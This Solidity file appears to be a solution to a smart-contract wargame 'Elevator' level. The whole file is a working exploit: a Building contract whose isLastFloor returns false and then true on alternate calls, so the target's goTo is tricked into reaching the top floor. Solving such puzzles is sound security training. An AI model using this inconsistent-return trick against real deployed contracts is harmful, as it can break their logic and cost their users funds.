// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Elevator{
    function goTo(uint256 _floor) external;
}

contract Building {
    uint256  count;
    Elevator IElevator;

    constructor(address _target) {
        count = 0;
        IElevator = Elevator(_target);
    }

    function isLastFloor(uint256 _floor) public returns(bool){
        if(count %2 == 0){
            count++;
            return false;
        }
        else{
            count++;
            return true;
        }
    }

    function attack() public {
        IElevator.goTo(5);
        IElevator.goTo(5);
    }
}
